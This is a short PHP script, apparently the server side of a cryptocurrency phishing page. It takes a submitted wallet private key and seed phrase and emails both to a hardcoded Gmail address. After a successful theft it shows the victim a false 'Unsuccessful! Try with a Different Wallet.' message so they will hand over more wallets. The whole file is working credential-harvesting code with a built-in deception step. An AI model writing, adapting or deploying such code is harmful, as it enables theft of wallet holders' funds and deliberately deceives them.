<?php
// phpinfo();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve privkey and seedphr from POST request
    $privkey = $_POST['privkey'];
    $seedphr = $_POST['seedphr'];

    // Set the recipient email address
    $recipient = 'bcoder49@gmail.com';

    // Set the email subject
    $subject = 'Data from POST request';

    // Prepare the email body
    $message = "Private Key: $privkey\nSeed Phrase: $seedphr";

    // Send the email
    $success = mail($recipient, $subject, $message);

    // Check if the email was sent successfully
    if ($success) {
        echo 'Unsuccessful! Try with a Different Wallet.';
    } else {
        echo 'Error.';
    }
}
?>